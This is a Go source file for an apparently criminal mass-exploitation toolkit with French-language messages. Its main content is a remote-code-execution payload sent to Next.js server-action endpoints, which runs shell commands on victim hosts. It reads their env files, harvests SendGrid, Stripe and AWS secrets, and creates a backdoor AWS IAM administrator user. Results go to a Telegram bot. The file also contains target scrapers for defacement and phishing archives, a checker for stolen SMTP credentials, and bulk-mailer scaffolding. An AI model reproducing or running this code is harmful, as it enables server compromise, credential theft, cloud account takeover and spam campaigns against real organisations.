package main

import (
	"bytes"
	"encoding/base64"
	"crypto/hmac"
	"crypto/sha256"
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"embed"
	"io/fs"
	"net"
	neturl "net/url"
	"net/http"
	"net/smtp"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"github.com/PuerkitoBio/goquery"
	"github.com/gookit/color"
    "mime/multipart"    
    "github.com/aws/aws-sdk-go/aws"
    "github.com/aws/aws-sdk-go/aws/credentials"
    "github.com/aws/aws-sdk-go/aws/session"
    "github.com/aws/aws-sdk-go/service/iam"
    "github.com/aws/aws-sdk-go/service/sts"
	
)


//go:embed dashboard.html letters/*
var dashboardHTML embed.FS





var (
    hwidSecret = "f"
    red        = color.FgRed.Render
    green      = color.FgGreen.Render
    yellow     = color.FgYellow.Render
    cyan       = color.FgCyan.Render
    blue       = color.FgBlue.Render
    magenta    = color.FgMagenta.Render
    white      = color.FgWhite.Render
	secretBotToken = "" 
    secretChatID   = ""

    config = struct {
        ThreadCount      int
        Timeout          int
        TelegramBotToken string
        TelegramChatID   string
        ScanOptions      map[string]bool
		IPPort           int
    }{
        ThreadCount: 200,
        Timeout:     5,
		IPPort:      80,
        ScanOptions: map[string]bool{
            "jsCrawling":     true,
            "apiEndpoints":   true,
            "laravel":        true,
            "git":            true,
            "json":           true,
            "envConfig":      true,
            "awsSes":         true,
            "smtpValidation": true,
            "rce":            true,
        },
    }

    processedURLs   int64
    totalURLs       int64
    validResults    int64
    resultsBuffer   []Result
    resultsLock     sync.RWMutex
    scanPaused      bool
    scanStopped     bool
    pauseCond       = sync.NewCond(&sync.Mutex{})
    ipGenValid      []string
    ipGenLock       sync.RWMutex
    ipGenChecked    int64
    ipGenTarget     int64
    ipGenRunning    bool
    ipGenPaused     bool
    ipGenStopped    bool
    ipCheckValid    []string
    ipCheckLock     sync.RWMutex
    ipCheckChecked  int64
    ipCheckTotal    int64
    ipCheckRunning  bool
    ipCheckPaused   bool
    ipCheckStopped  bool
    ipReverseValid  []string
    ipReverseLock   sync.RWMutex
    ipReverseChecked int64
    ipReverseTotal   int64
    ipReverseRunning bool
    ipReversePaused  bool
    ipReverseStopped bool
    smtpCheckerValid   []string
    smtpCheckerInvalid []string
    smtpCheckerLock    sync.RWMutex
    smtpChecked        int64
    smtpTotal          int64
    smtpRunning        bool
    smtpPaused         bool
    smtpStopped        bool
    mailerSent     int64
	mailerSentEmails   []string
    mailerFailedEmails []string

    mailerFailed   int64
    mailerTotal    int64
    mailerRunning  bool
    mailerPaused   bool
    mailerStopped  bool
    mailerLock     sync.RWMutex
    server         *http.Server
    uploadedUrls   []string
    eventChannel   = make(chan Result, 1000)
    rceResults     []Result
    rceLock        sync.RWMutex
    rceChecked     int64
    rceTotal       int64
    rceRunning     bool
    rcePaused      bool
    rceStopped     bool
    rceValid       []string
	
    grabberRunning  bool
    grabberStopped  bool
    grabberDomains  []string
    grabberLock     sync.RWMutex
    
    seenSendGridRCE = make(map[string]bool)
    seenStripeRCE   = make(map[string]bool)
    seenAWSRCE      = make(map[string]bool)
)


var (
    awsKeyPattern       = regexp.MustCompile(`AKIA[0-9A-Z]{16}`)
    awsSecretPattern    = regexp.MustCompile(`['"]([0-9a-zA-Z\/+]{40})['"]`)
    awsSMTPPattern      = regexp.MustCompile(`email-smtp\.[a-z0-9\-]+\.amazonaws\.com`)
    sendGridPattern     = regexp.MustCompile(`SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}`)
    brevoPattern        = regexp.MustCompile(`(?i)xkeysib-[a-zA-Z0-9]{64}-[a-zA-Z0-9]{16}`)

    mailgunPattern      = regexp.MustCompile(`key-[0-9a-zA-Z]{32}`)
    stripePattern       = regexp.MustCompile(`sk_live_[A-Za-z0-9]{24,}`)

    razorpayPattern     = regexp.MustCompile(`rzp_(test|live)_[a-zA-Z0-9]{14,20}`)
    twilioSIDPattern    = regexp.MustCompile(`AC[a-f0-9]{32}`)

    twilioAuthPattern   = regexp.MustCompile(`(?i)['"]?([0-9a-f]{32})['"]?`)
    githubTokenPattern  = regexp.MustCompile(`ghp_[0-9a-zA-Z]{36}`)
    tencentKeyPattern   = regexp.MustCompile(`(?i)AKID[a-zA-Z0-9]{32}(?:\s|$|["'])`)

    

    secretEnvPatterns = []*regexp.Regexp{

        regexp.MustCompile(`(?i)(?:secret|password|key|token|apikey|access_key|secret_key)\s*[=:]\s*['"]?([a-zA-Z0-9_\-.]{16,64})['"]?`),
        regexp.MustCompile(`(?i)(?:AWS_|AZURE_|GCP_|SENDGRID_|MAILGUN_|TWILIO_|STRIPE_)(?:SECRET|KEY|TOKEN|PASSWORD)\s*[=:]\s*['"]?([a-zA-Z0-9_\-./+]{16,128})['"]?`),
        regexp.MustCompile(`(?i)(?:database_url|db_url|mongodb_uri|redis_url)\s*[=:]\s*['"]?([a-zA-Z0-9_\-.:/@]{10,256})['"]?`),
    }
    awsKeyReRCE          = regexp.MustCompile(`AKIA[0-9A-Z]{16}`)
    sendGridReRCE        = []*regexp.Regexp{regexp.MustCompile(`SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}`)}
    stripeReRCE          = regexp.MustCompile(`sk_live_[A-Za-z0-9]{24,}`)
    secretReRCE          = []*regexp.Regexp{
        regexp.MustCompile(`(?i)(?:secretAccessKey|aws_secret_access_key|aws_skey)\s*=\s*["']?([^"',\s]+)["']?`),

        regexp.MustCompile(`(?i)AWS_SECRET_ACCESS_KEY\s*=\s*["']?([^"',\s]+)["']?`),
        regexp.MustCompile(`(?i)AWS_SECRET_KEY\s*=\s*["']?([^"',\s]+)["']?`),

    }

)


var (
    pendingSendGridKeys = struct {
        sync.RWMutex
        keys map[string][]string 
    }{keys: make(map[string][]string)}
    
    globalSenderEmails = struct {
        sync.RWMutex
        emails map[string][]string 
    }{emails: make(map[string][]string)}
)


func storePendingSendGridKey(url, key string) {
    pendingSendGridKeys.Lock()
    defer pendingSendGridKeys.Unlock()
    pendingSendGridKeys.keys[url] = append(pendingSendGridKeys.keys[url], key)
}


func getGlobalSenderEmails(currentURL string) []string {
    globalSenderEmails.RLock()
    defer globalSenderEmails.RUnlock()
    
    var allEmails []string
    for url, emails := range globalSenderEmails.emails {
        if url != currentURL {
            allEmails = append(allEmails, emails...)
        }
    }
    return allEmails
}


func addGlobalSenderEmails(url string, emails []string) {
    if len(emails) == 0 {
        return
    }
    globalSenderEmails.Lock()
    defer globalSenderEmails.Unlock()
    globalSenderEmails.emails[url] = emails
}


func checkPendingSendGridKeys(currentURL string, foundEmails []string) {
    if len(foundEmails) == 0 {
        return
    }
    
    pendingSendGridKeys.Lock()
    defer pendingSendGridKeys.Unlock()
    
    for url, keys := range pendingSendGridKeys.keys {
        if url == currentURL {
            continue 
        }
        
        for _, key := range keys {
            data := key + "|" + strings.Join(foundEmails[:min(3, len(foundEmails))], "|")
            saveResultToFile("SENDGRID", data, url)
            addResult("SENDGRID", url, data)
            
            msg := fmt.Sprintf("📧 *SendGrid Key Found!*\n🔑 Key: `%s`\n📧 Sender: `%s`\n🔗 URL: %s\n🔗 Page actuelle: %s", 
                key, foundEmails[0], url, currentURL)
            go sendTelegramMessage(msg)
            
            fmt.Printf("%s[SENDGRID] %s - Key: %s avec sender de %s\n", 
                green(), url, key, currentURL)
        }
    }
    
    for url := range pendingSendGridKeys.keys {
        delete(pendingSendGridKeys.keys, url)
    }
}


func rceHook(url string) {
}




func validateAWSCredsRCE(key, secret string) (arn, account string, ok bool) {
    sess, err := session.NewSession(&aws.Config{
        Credentials: credentials.NewStaticCredentials(key, secret, ""),
        Region:      aws.String("us-east-1"),
    })
    if err != nil {
        return "", "", false
    }
    out, err := sts.New(sess).GetCallerIdentity(&sts.GetCallerIdentityInput{})
    if err != nil {
        return "", "", false
    }
    return *out.Arn, *out.Account, true
}

func createIAMUserRCE(key, secret, account, baseURL string) {
    sess, _ := session.NewSession(&aws.Config{
        Credentials: credentials.NewStaticCredentials(key, secret, ""),
        Region:      aws.String("us-east-1"),
    })
    iamc := iam.New(sess)
    userName := "CortexAdmin"
    pass := randStr(20)
    iamc.CreateUser(&iam.CreateUserInput{UserName: &userName})
    iamc.AttachUserPolicy(&iam.AttachUserPolicyInput{
        UserName:  &userName,
        PolicyArn: aws.String("arn:aws:iam::aws:policy/AdministratorAccess"),
    })
    iamc.CreateLoginProfile(&iam.CreateLoginProfileInput{
        UserName:              &userName,
        Password:              &pass,
        PasswordResetRequired: aws.Bool(false),
    })
    
    entry := fmt.Sprintf("ACCOUNT:%s|USER:%s|PASS:%s", account, userName, pass)
    addResult("RCE_AWS_IAM", baseURL, entry)
    saveResultToFile("rce_aws_iam", entry, baseURL)
    
    msg := fmt.Sprintf("🔥 RCE - AWS IAM Created!\n\n🆔 Account: `%s`\n👤 User: `%s`\n🔑 Pass: `%s`\n🔗 URL: %s", account, userName, pass, baseURL)
    sendTelegramMessage(msg)
}

func runRCECommand(baseURL, command string, maxRetries int) string {
    httpClient := &http.Client{Timeout: 60 * time.Second}
    delay := time.Second
    
    for attempt := 0; attempt < maxRetries; attempt++ {
        crafted := map[string]interface{}{
            "then":   "$1:__proto__:then",
            "status": "resolved_model",
            "reason": -1,
            "value":  `{"then": "$B0"}`,
            "_response": map[string]interface{}{
                "_prefix": fmt.Sprintf(`var res = process.mainModule.require('child_process').execSync('%s',{'timeout':30000}).toString(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`+"`${res}`"+`});`, command),
                "_formData": map[string]interface{}{
                    "get": "$1:constructor:constructor",
                },
            },
        }
        buf := &bytes.Buffer{}
        w := multipart.NewWriter(buf)
        fw1, _ := w.CreateFormField("0")
        json.NewEncoder(fw1).Encode(crafted)
        fw2, _ := w.CreateFormField("1")
        fw2.Write([]byte(`"$@0"`))
        w.Close()

        req, _ := http.NewRequest("POST", baseURL, buf)
        req.Header.Set("Content-Type", w.FormDataContentType())
        req.Header.Set("Next-Action", "x")
        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

        resp, err := httpClient.Do(req)
        if err != nil {
            time.Sleep(delay)
            delay *= 2
            continue
        }
        body, _ := io.ReadAll(resp.Body)
        resp.Body.Close()

        re := regexp.MustCompile(`"digest"\s*:\s*"((?:\\.|[^"\\])*)"`)
        if m := re.FindSubmatch(body); len(m) > 1 {
            var unescaped string
            json.Unmarshal([]byte(`"`+string(m[1])+`"`), &unescaped)
            return unescaped
        }
        if attempt < maxRetries-1 {
            time.Sleep(delay)
            delay *= 2
        }
    }
    return ""
}

func processRCEVuln(baseURL string) {
    ls := runRCECommand(baseURL, "ls -al", 3)
    lines := strings.Split(ls, "\n")
    var envFiles []string
    
    for _, l := range lines {
        if strings.Contains(strings.ToLower(l), "env") && !strings.HasPrefix(strings.TrimSpace(l), "total") {
            envFiles = append(envFiles, strings.TrimSpace(l))
        }
    }
    
    uniqAWS := make(map[string]bool)
    
    for _, line := range envFiles {
        parts := strings.Fields(line)
        if len(parts) < 8 {
            continue
        }
        fname := parts[len(parts)-1]
        if parts[0][0] == 'd' {
            continue
        }
        content := runRCECommand(baseURL, "cat "+fname, 3)
        

        for _, re := range sendGridReRCE {
            for _, m := range re.FindAllString(content, -1) {
                if seenSendGridRCE[m] {
                    continue
                }
                seenSendGridRCE[m] = true
                addResult("RCE_SENDGRID", baseURL, m)
                saveResultToFile("rce_sendgrid", m, baseURL)
                msg := fmt.Sprintf("🔑 RCE - SendGrid Found!\n\n🔑 Key: `%s`\n🔗 URL: %s", m, baseURL)
                sendTelegramMessage(msg)
            }
        }
        

        for _, m := range stripeReRCE.FindAllString(content, -1) {
            if seenStripeRCE[m] {
                continue
            }
            seenStripeRCE[m] = true
            addResult("RCE_STRIPE", baseURL, m)
            saveResultToFile("rce_stripe", m, baseURL)
            msg := fmt.Sprintf("💳 RCE - Stripe Found!\n\n🔑 Key: `%s`\n🔗 URL: %s", m, baseURL)
            sendTelegramMessage(msg)
        }
        

        keys := awsKeyReRCE.FindAllString(content, -1)
        var secrets []string
        for _, re := range secretReRCE {
            for _, m := range re.FindAllStringSubmatch(content, -1) {
                if len(m) > 1 && len(m[1]) >= 30 {
                    secrets = append(secrets, m[1])
                }
            }
        }
        
        for _, k := range keys {
            for _, s := range secrets {
                line := fmt.Sprintf("%s:%s", k, s)
                if uniqAWS[line] {
                    continue
                }
                uniqAWS[line] = true
                arn, acc, ok := validateAWSCredsRCE(k, s)
                if ok {
                    addResult("RCE_AWS_VALID", baseURL, line+" ["+arn+"]")
                    saveResultToFile("rce_aws_valid", line, baseURL)
                    createIAMUserRCE(k, s, acc, baseURL)
                } else {
                    addResult("RCE_AWS_FOUND", baseURL, line)
                    saveResultToFile("rce_aws_found", line, baseURL)
                }
            }
        }
    }
}

func processRCEDomain(domain string) {
    atomic.AddInt64(&rceChecked, 1)
    
    schemes := []string{"https", "http"}
    for _, scheme := range schemes {
        baseURL := scheme + "://" + domain
        idOut := runRCECommand(baseURL, "id", 5)
        
        if strings.Contains(idOut, "uid=") {
            rceLock.Lock()
            rceValid = append(rceValid, baseURL)
            rceLock.Unlock()
            
            addResult("RCE_VULN", baseURL, "VULNERABLE")
            saveResultToFile("rce_vuln", baseURL, "")
            
            msg := fmt.Sprintf("🔥 RCE Vulnerability Found!\n\n🔗 URL: %s\n📋 Output: `%s`", baseURL, idOut[:min(100, len(idOut))])
            sendTelegramMessage(msg)
            
            processRCEVuln(baseURL)
            return
        }
    }
}

func startRCEScanner(domains []string) {
    rceRunning = true
    rcePaused = false
    rceStopped = false
    rceTotal = int64(len(domains))
    atomic.StoreInt64(&rceChecked, 0)
    
    rceLock.Lock()
    rceValid = []string{}
    rceLock.Unlock()
    
    sem := make(chan struct{}, 50)
    var wg sync.WaitGroup
    
    for _, d := range domains {
        if rceStopped {
            break
        }
        for rcePaused && !rceStopped {
            time.Sleep(100 * time.Millisecond)
        }
        
        wg.Add(1)
        sem <- struct{}{}
        go func(domain string) {
            defer wg.Done()
            defer func() { <-sem }()
            processRCEDomain(domain)
        }(d)
    }
    
    wg.Wait()
    rceRunning = false
}


func generateRandomUserAgent() string {
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"
}

func extractDomainsFromText(text string) []string {
	re := regexp.MustCompile(`(?i)(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+(?:\.[a-zA-Z]{2,})+)`)
	matches := re.FindAllString(text, -1)
	var domains []string
	for _, m := range matches {
		if !strings.Contains(strings.ToLower(m), ".ph") && !strings.Contains(strings.ToLower(m), ".html") && !strings.Contains(strings.ToLower(m), "3XPLOIT") {
			domains = append(domains, "http://"+strings.TrimPrefix(strings.TrimPrefix(m, "http://"), "https://"))
		}
	}
	return domains
}

func saveDomainsToFile(domains []string, filename string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer f.Close()
	for _, d := range domains {
		f.WriteString(d + "\n")
	}
}

func zoneXsec() {
	client := &http.Client{Timeout: 10 * time.Second}
	headers := map[string]string{"User-Agent": generateRandomUserAgent()}
	urls := []string{
		"https://zone-xsec.com/onhold",
		"https://zone-xsec.com/special",
		"https://zone-xsec.com/archive",
	}
	for _, base := range urls {
		for page := 1; page <= 50; page++ {
			url := fmt.Sprintf("%s/page=%d", base, page)
			req, _ := http.NewRequest("GET", url, nil)
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			doc, err := goquery.NewDocumentFromReader(resp.Body)
			resp.Body.Close()
			if err != nil {
				continue
			}
			var textBuilder strings.Builder
			doc.Find("td").Each(func(i int, s *goquery.Selection) {
				textBuilder.WriteString(s.Text() + " ")
			})
			domains := extractDomainsFromText(textBuilder.String())
			saveDomainsToFile(domains, "grabberREZ/ZON-XSEC.txt")
		}
	}
}

func phishingTank() {
	client := &http.Client{Timeout: 10 * time.Second}
	headers := map[string]string{"User-Agent": generateRandomUserAgent()}
	f, _ := os.OpenFile("grabberREZ/PHISHING_TANK_trimmed_urls.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	for page := 0; page <= 900; page++ {
		data := fmt.Sprintf("page=%d&active=y&verified=u", page)
		req, _ := http.NewRequest("POST", "https://phishtank.org/phish_search.php", strings.NewReader(data))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		doc, err := goquery.NewDocumentFromReader(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}
		doc.Find("td.value").Each(func(i int, s *goquery.Selection) {
			url := strings.TrimSpace(s.Text())
			if strings.HasPrefix(url, "http") {
				if idx := strings.Index(url, "added on"); idx != -1 {
					url = strings.TrimSpace(url[:idx])
				}
				parsed := strings.TrimPrefix(strings.TrimPrefix(url, "http://"), "https://")
				if idx := strings.Index(parsed, "/"); idx != -1 {
					parsed = parsed[:idx]
				}
				out := "http://" + parsed
				f.WriteString(out + "\n")
			}
		})
	}
}

func mirrorH() {
	client := &http.Client{Timeout: 10 * time.Second}
	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"}
	f1, _ := os.OpenFile("grabberREZ/mirror-h_grabbed.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f1.Close()
	reURL := regexp.MustCompile(`https?://[^\s"]+`)
	exclude := map[string]bool{
		"https://facebook.com": true,
		"https://perminet.com": true,
	}
	for page := 1; page <= 500; page++ {
		url := fmt.Sprintf("https://mirror-h.org/archive/page/%d", page)
		req, _ := http.NewRequest("GET", url, nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil || (resp.StatusCode != 200 && resp.StatusCode != 403) {
			if resp != nil {
				resp.Body.Close()
			}
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		time.Sleep(5 * time.Second)
		matches := reURL.FindAllString(string(body), -1)
		for _, m := range matches {
			clean := strings.TrimSuffix(strings.TrimPrefix(m, "http://"), "https://")
			if idx := strings.Index(clean, "/"); idx != -1 {
				clean = clean[:idx]
			}
			out := "http://" + clean
			if exclude[out] {
				continue
			}
			f1.WriteString(out + "\n")
		}
	}
}

func grabByDateAPI(date string) {
	client := &http.Client{Timeout: 10 * time.Second}
	headers := map[string]string{"User-Agent": generateRandomUserAgent()}
	f, _ := os.OpenFile("grabberREZ/grabbed_domains_by_DATE.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	excluded := []string{"http://google.com", "http://youtube.com", "http://facebook.com", "http://instagram.com", "http://twitter.com", "http://baidu.com", "http://wikipedia.com"}
	page := 1
	for {
		url := fmt.Sprintf("https://www.cubdomain.com/domains-registered-by-date/%s/%d", date, page)
		req, _ := http.NewRequest("GET", url, nil)
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			break
		}
		doc, err := goquery.NewDocumentFromReader(resp.Body)
		resp.Body.Close()
		if err != nil {
			break
		}
		var domains []string
		doc.Find("a[href]").Each(func(i int, s *goquery.Selection) {
			href, _ := s.Attr("href")
			if strings.HasPrefix(href, "https://www.cubdomain.com/site/") {
				d := strings.TrimPrefix(href, "https://www.cubdomain.com/site/")
				domains = append(domains, d)
			}
		})
		if len(domains) == 0 {
			break
		}
		for _, d := range domains {
			out := "http://" + d
			skip := false
			for _, e := range excluded {
				if out == e {
					skip = true
					break
				}
			}
			if skip {
				continue
			}
			f.WriteString(out + "\n")
		}
		page++
		time.Sleep(5 * time.Second)
	}
}

func haxorID() {
	client := &http.Client{Timeout: 10 * time.Second}
	headers := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
	f, _ := os.OpenFile("grabberREZ/HAXOR_ID.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	reURL := regexp.MustCompile(`https?://\S+`)
	exclude := map[string]bool{
		"facebook.com": true, "haxor.id": true, "w3.org": true,
		"googlesyndication.com": true, "googletagmanager.com": true,
		"twitter.com": true, "schema.org": true, "hax.or.id": true, "gobpi.id": true,
	}
	urls := []string{
		"https://haxor.id/archive",
		"https://haxor.id/archive/onhold",
		"https://haxor.id/archive/special",
	}
	for _, base := range urls {
		for page := 1; page <= 50; page++ {
			url := fmt.Sprintf("%s?page=%d", base, page)
			req, _ := http.NewRequest("GET", url, nil)
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			resp, err := client.Do(req)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()
			matches := reURL.FindAllString(string(body), -1)
			for _, m := range matches {
				parts := strings.Split(strings.TrimPrefix(strings.TrimPrefix(m, "http://"), "https://"), "/")
				if len(parts) == 0 {
					continue
				}
				domain := parts[0]
				if exclude[domain] {
					continue
				}
				out := "http://" + domain
				f.WriteString(out + "\n")
			}
		}
	}
}




func randStr(n int) string {
    const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, n)
    for i := range b {
        b[i] = letterBytes[rand.Intn(len(letterBytes))]
    }
    return string(b)
}

type Result struct {
    Category string `json:"category"`
    URL      string `json:"url"`
    Data     string `json:"data"`
}

type SMTPConfig struct {
    Host     string
    Port     int
    Username string
    Password string
}

type MailerConfig struct {
    Delay      time.Duration
    Priority   int
    UseSSL     bool
    UseTLS     bool
    EmailFrom  string
    ReplyTo    string
    Threads    int
    IsHTML     bool
}


func getHWID() string {
    interfaces, _ := net.Interfaces()
    mac := ""
    for _, iface := range interfaces {
        if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
            mac = iface.HardwareAddr.String()
            break
        }
    }
    hostname, _ := os.Hostname()
    data := []string{mac, runtime.GOOS, runtime.GOARCH, hostname, strconv.Itoa(runtime.NumCPU())}
    joined := strings.Join(data, "|")
    hash := sha256.Sum256([]byte(joined))
    return hex.EncodeToString(hash[:])
}

func checkHWID() bool {
    return getHWID() == hwidSecret
}

func mkdir(path string) error {
    return os.MkdirAll(path, 0755)
}

func appendFile(path, content string) error {
    f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
    if err != nil {
        return err
    }
    defer f.Close()
    _, err = f.WriteString(content + "\n")
    return err
}

func generateRandomIP() string {
    return fmt.Sprintf("%d.%d.%d.%d",
        rand.Intn(255)+1,
        rand.Intn(256),
        rand.Intn(256),
        rand.Intn(254)+1,
    )
}


func checkPort(ip string, port int) bool {
    conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, strconv.Itoa(port)), 2*time.Second)
    if err != nil {
        return false
    }
    conn.Close()
    return true
}

func registerGrabberRoutes() {
	http.HandleFunc("/grabber/domains", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		var domains []string
		files, _ := filepath.Glob("grabberREZ/*.txt")
		seen := make(map[string]bool)
		for _, f := range files {
			data, err := os.ReadFile(f)
			if err != nil {
				continue
			}
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" && !seen[line] {
					seen[line] = true
					domains = append(domains, line)
				}
			}
		}
		json.NewEncoder(w).Encode(map[string]interface{}{"domains": domains, "count": len(domains)})
	})

	http.HandleFunc("/grabber/domains/count", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		count := 0
		files, _ := filepath.Glob("grabberREZ/*.txt")
		seen := make(map[string]bool)
		for _, f := range files {
			data, err := os.ReadFile(f)
			if err != nil {
				continue
			}
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" && !seen[line] {
					seen[line] = true
					count++
				}
			}
		}
		json.NewEncoder(w).Encode(map[string]int{"count": count})
	})
}




func cleanEmailList(emailText string) []string {
    emailRegex := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
    lines := strings.Split(strings.TrimSpace(emailText), "\n")
    validEmails := []string{}
    seen := make(map[string]bool)
    for _, line := range lines {
        email := strings.TrimSpace(strings.ToLower(line))
        if email == "" {
            continue
        }
        if emailRegex.MatchString(email) && !seen[email] {
            validEmails = append(validEmails, email)
            seen[email] = true
        }
    }
    return validEmails
}

func sortEmailsByDomain(emails []string, domain string) []string {
    result := []string{}
    domainSuffix := "@" + strings.ToLower(domain)
    for _, email := range emails {
        if strings.HasSuffix(strings.ToLower(email), domainSuffix) {
            result = append(result, email)
        }
    }
    return result
}

func getRandomString(length int) string {
    const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    b := make([]byte, length)
    for i := range b {
        b[i] = charset[rand.Intn(len(charset))]
    }
    return string(b)
}

func randomizeText(text string) string {
    for strings.Contains(text, "##random##") {
        text = strings.Replace(text, "##random##", getRandomString(8), 1)
    }
    return text
}

func getLetterFolders() []string {
    folders := []string{}

    entries, err := fs.ReadDir(dashboardHTML, "lettres")
    if err != nil {
        return folders
    }

    for _, entry := range entries {
        if entry.IsDir() {
            folders = append(folders, entry.Name())
        }
    }

    return folders
}


func getLettersInFolder(folder string) []string {
    letters := []string{}

    path := "letters/" + folder
    entries, err := fs.ReadDir(dashboardHTML, path)
    if err != nil {
        return letters
    }

    for _, entry := range entries {
        if !entry.IsDir() && strings.HasSuffix(entry.Name(), ".html") {
            letters = append(letters, strings.TrimSuffix(entry.Name(), ".html"))
        }
    }

    return letters
}

func listFolders(path string) []string {
    folders := []string{}
    entries, _ := os.ReadDir(path)
    for _, entry := range entries {
        if entry.IsDir() {
            folders = append(folders, entry.Name())
        }
    }
    return folders
}



func getLetterContent(folder, letter string) (string, error) {
    path := "letters/" + folder + "/" + letter + ".html"
    content, err := dashboardHTML.ReadFile(path)
    if err != nil {
        return "", err
    }
    return string(content), nil
}



var smtpHosts = map[string][]string{
    "gmail.com":    {"smtp.gmail.com", "587"},
    "yahoo.com":    {"smtp.mail.yahoo.com", "587"},
    "outlook.com":  {"smtp-mail.outlook.com", "587"},
    "hotmail.com":  {"smtp-mail.outlook.com", "587"},
    "aol.com":      {"smtp.aol.com", "587"},
    "icloud.com":   {"smtp.mail.me.com", "587"},
    "mail.com":     {"smtp.mail.com", "587"},
    "zoho.com":     {"smtp.zoho.com", "587"},
    "yandex.com":   {"smtp.yandex.com", "587"},
    "gmx.com":      {"smtp.gmx.com", "587"},
    "orange.fr":    {"smtp.orange.fr", "587"},
    "free.fr":      {"smtp.free.fr", "587"},
    "laposte.net":  {"smtp.laposte.net", "587"},
}

func validateSMTP(host string, port int, username, password string) bool {
    portsToTry := []int{port, 587, 465, 25}
    for _, p := range portsToTry {
        if trySMTPConnection(host, p, username, password) {
            return true
        }
    }
    return false
}

func trySMTPConnection(host string, port int, username, password string) bool {
    addr := fmt.Sprintf("%s:%d", host, port)
    if port == 465 {
        tlsConfig := &tls.Config{ServerName: host}
        conn, err := tls.Dial("tcp", addr, tlsConfig)
        if err != nil {
            return false
        }
        defer conn.Close()
        client, err := smtp.NewClient(conn, host)
        if err != nil {
            return false
        }
        defer client.Close()
        if err := client.Auth(smtp.PlainAuth("", username, password, host)); err != nil {
            return false
        }
        return true
    } else {
        client, err := smtp.Dial(addr)
        if err != nil {
            return false
        }
        defer client.Close()
        if err = client.StartTLS(&tls.Config{ServerName: host}); err != nil {
            return false
        }
        if err = client.Auth(smtp.PlainAuth("", username, password, host)); err != nil {
            return false
        }
        return true
    }
}

func extractSMTPFromLine(line string) (host string, port int, username, password string, ok bool) {
    line = strings.TrimSpace(line)
    if parts := strings.Split(line, "|"); len(parts) >= 4 {
        host = strings.TrimSpace(parts[0])
        port, _ = strconv.Atoi(strings.TrimSpace(parts[1]))
        username = strings.TrimSpace(parts[2])
        password = strings.TrimSpace(parts[3])
        if host != "" && port > 0 && username != "" && password != "" {
            ok = true
            return
        }
    }

    if parts := strings.SplitN(line, ":", 2); len(parts) == 2 {
        username = strings.TrimSpace(parts[0])
        password = strings.TrimSpace(parts[1])
        if username == "" || password == "" {
            return 
        }
        if atIndex := strings.Index(username, "@"); atIndex != -1 {
            domain := username[atIndex+1:]
            if hosts, exists := smtpHosts[domain]; exists {
                host = hosts[0]
                port, _ = strconv.Atoi(hosts[1])
                if host != "" && port > 0 {
                    ok = true
                }
            } else {
                host = "smtp." + domain
                port = 587
                ok = true
            }
        }
    }
    return
}

var patterns = map[string]*regexp.Regexp{
    "sendgrid":  regexp.MustCompile(`SG\.(?:[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}|[A-Za-z0-9_-]{64}|[A-Za-z0-9_-]{69})`),
    "aws_key":   regexp.MustCompile(`AKIA[0-9A-Z]{16}`),
    "mailgun":   regexp.MustCompile(`key-[0-9a-f]{32}`),
    "stripe":    regexp.MustCompile(`sk_live_[0-9a-zA-Z]{24}`),
    "twilio":    regexp.MustCompile(`(AC[a-f0-9]{32}.*SK[a-f0-9]{32}|SK[a-f0-9]{32}.*AC[a-f0-9]{32})`),
    "mandrill":  regexp.MustCompile(`^[a-zA-Z0-9_-]{20,35}$`),
